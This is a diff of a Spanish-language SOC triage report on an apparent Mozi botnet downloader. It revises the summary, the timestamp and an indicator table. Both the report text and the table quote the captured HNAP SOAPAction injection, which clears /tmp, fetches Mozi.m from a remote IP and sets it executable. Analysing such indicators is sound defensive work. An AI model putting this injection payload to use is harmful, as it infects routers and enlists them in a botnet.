@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with very long lines (531), with CRLF line terminators de 796 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `HNAP1` en `hxxp://purenetworks[.]com/HNAP1/`. Se extrajeron 5 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:58:55+00:00`
+- **Registrado:** `2026-08-09T20:58:55.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,15 +54,15 @@ SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 172.168.176.XXX | static_analysis |
-| ip | 190.179.160.XXX | static_analysis |
-| url | hxxp://172.168.176.XXX:47500/Mozi.m | strings |
 | url | hxxp://purenetworks[.]com/HNAP1/ | strings |
-| url | hxxp://schemas[.]xmlsoap[.]org/soap/envelope/ | strings |
-| url | hxxp://www[.]w3[.]org/2001/XMLSchema | strings |
 | url | hxxp://www[.]w3[.]org/2001/XMLSchema-instance | strings |
-| hash | a61b754f4d90ca6efb4aeff83951f5e0b633bedd6d7f9737bc8fb2bc10ac76b0 | static_analysis |
+| url | hxxp://www[.]w3[.]org/2001/XMLSchema | strings |
+| url | hxxp://172.168.176.XXX:47500/Mozi.m | strings |
+| url | hxxp://schemas[.]xmlsoap[.]org/soap/envelope/ | strings |
+| ip | 190.179.160.XXX | static_analysis |
+| ip | 172.168.176.XXX | static_analysis |
 | command | SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://172.168.176.XXX:47500/Mozi.m && chmod 777 | strings |
+| hash | a61b754f4d90ca6efb4aeff83951f5e0b633bedd6d7f9737bc8fb2bc10ac76b0 | static_analysis |
 | ip | 103.74.21.XXX | artifact_source |
 
 ## 🔎 Triage
